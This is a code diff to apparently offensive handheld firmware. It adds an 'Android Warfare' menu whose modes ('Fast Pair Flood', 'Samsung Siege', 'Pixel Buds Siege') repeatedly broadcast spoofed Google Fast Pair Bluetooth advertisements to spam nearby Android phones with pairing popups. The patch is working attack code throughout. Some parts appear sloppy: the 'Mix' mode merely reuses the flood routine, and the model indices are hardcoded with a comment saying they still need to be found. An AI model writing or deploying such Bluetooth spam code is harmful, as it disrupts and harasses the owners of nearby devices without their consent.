@@ -129,9 +129,17 @@ void ik_nuclear_setup();
 void ik_nuclear_loop();
 void ik_sniper_setup();
 void ik_sniper_loop();
-void sd_mount_setup();
-void sd_mount_loop();
 void lanmenu_setup();
+void androidmenu_setup();
+void androidmenu_loop();
+void af_flood_setup();
+void af_flood_loop();
+void af_mix_setup();
+void af_mix_loop();
+void af_samsung_setup();
+void af_samsung_loop();
+void af_pixel_setup();
+void af_pixel_loop();
 void getSSID();
 void setupWiFi();
 void setupWebServer();
@@ -386,6 +394,7 @@ bool rstOverride = false;   // Reset Button Override. Set to true when navigatin
 bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
 bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
 bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
+int androidModelOverride = -1; // -1 for random, otherwise specific index
 bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
 bool portal_active = false; // Internal flag used to ensure NOVA Portal exits cleanly
 bool activeQR = false; 
@@ -673,6 +682,31 @@ void iosmenu_setup() {
 }
 
 void iosmenu_loop() {
+  menuController.loop();
+}
+
+/// Android Warfare MENU ///
+MENU androidmenu[] = {
+  { "Back", 1},
+  { "Fast Pair Flood", 52},
+  { "Android Mix", 53},
+  { "Samsung Siege", 54},
+  { "Pixel Buds Siege", 55},
+};
+int androidmenu_size = sizeof(androidmenu) / sizeof(MENU);
+
+void androidmenu_setup() {
+  cursor = 0;
+  rstOverride = true;
+  androidmenu[0].name = TXT_BACK;
+  androidmenu[1].name = TXT_PN_FP_FL;
+  androidmenu[2].name = TXT_PN_AND_MIX;
+  androidmenu[3].name = TXT_PN_SAMSUNG;
+  androidmenu[4].name = TXT_PN_PIXEL;
+  menuController.setup(androidmenu, androidmenu_size);
+}
+
+void androidmenu_loop() {
   menuController.loop();
 }
 
@@ -1966,7 +2000,7 @@ void aj_adv(){
       packet[i++] = 0x16; // AD Type (Service Data)
       packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
       packet[i++] = 0xFE; // ...
-      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
+      const uint32_t model = (androidModelOverride == -1) ? android_models[rand() % android_models_count].value : android_models[androidModelOverride].value; // Action Type
       packet[i++] = (model >> 0x10) & 0xFF;
       packet[i++] = (model >> 0x08) & 0xFF;
       packet[i++] = (model >> 0x00) & 0xFF;
@@ -2694,6 +2728,11 @@ ProcessHandler processes[] = {
   {45, sa_mix_setup, sa_mix_loop, "SA v2 Mix"},
   {46, ik_nuclear_setup, ik_nuclear_loop, "iKiller Nuclear"},
   {47, ik_sniper_setup, ik_sniper_loop, "iKiller Sniper"},
+  {51, androidmenu_setup, androidmenu_loop, "Android Warfare Menu"},
+  {52, af_flood_setup, af_flood_loop, "Fast Pair Flood"},
+  {53, af_mix_setup, af_mix_loop, "Android Mix"},
+  {54, af_samsung_setup, af_samsung_loop, "Samsung Siege"},
+  {55, af_pixel_setup, af_pixel_loop, "Pixel Buds Siege"},
 #if defined(SDCARD) && !defined(CARDPUTER)
   {97, nullptr, ToggleSDCard, "SD Card"},
 #endif
@@ -2714,6 +2753,7 @@ void rebuildMenus() {
   #endif
   mmenu[i++].name = TXT_MN_USB;
   mmenu[i++].name = TXT_MN_IOS;
+  mmenu[i++].name = TXT_MN_AND;
   mmenu[i++].name = TXT_SETTINGS;
 
   // Settings Menu labels
@@ -4488,4 +4528,78 @@ void ik_sniper_loop() {
     isSwitching = true;
     delay(250);
   }
+}
+
+// Implementation of Android sub-modules (v1.1 Beta)
+void af_flood_setup() {
+  pAdvertising->stop();
+  delay(100);
+  androidPair = true;
+  androidModelOverride = -1; // Random models
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Fast Pair Flood");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Sending popups...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void af_flood_loop() {
+  androidPair = true;
+  aj_adv();
+  if (check_next_press()) {
+    pAdvertising->stop();
+    androidPair = false;
+    current_proc = 51;
+    isSwitching = true;
+    delay(250);
+  }
+}
+
+void af_mix_setup() {
+  af_flood_setup();
+  DISP.setCursor(0, 0);
+  DISP.println(" Android Mix Mode");
+}
+
+void af_mix_loop() {
+  af_flood_loop();
+}
+
+void af_samsung_setup() {
+  pAdvertising->stop();
+  delay(100);
+  androidPair = true;
+  // Find Samsung S23 Ultra index in android_models
+  androidModelOverride = 100; // Galaxy S23 Ultra
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Samsung Siege");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Spamming S23 Ultra...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void af_samsung_loop() {
+  af_flood_loop();
+}
+
+void af_pixel_setup() {
+  pAdvertising->stop();
+  delay(100);
+  androidPair = true;
+  androidModelOverride = 110; // Google Pixel buds
+  DISP.fillScreen(BGCOLOR);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(RED, BGCOLOR);
+  DISP.println(" Pixel Buds Siege");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+  DISP.println("Spamming Pixel Buds...");
+  DISP.println(TXT_SEL_EXIT2);
+}
+
+void af_pixel_loop() {
+  af_flood_loop();
 }
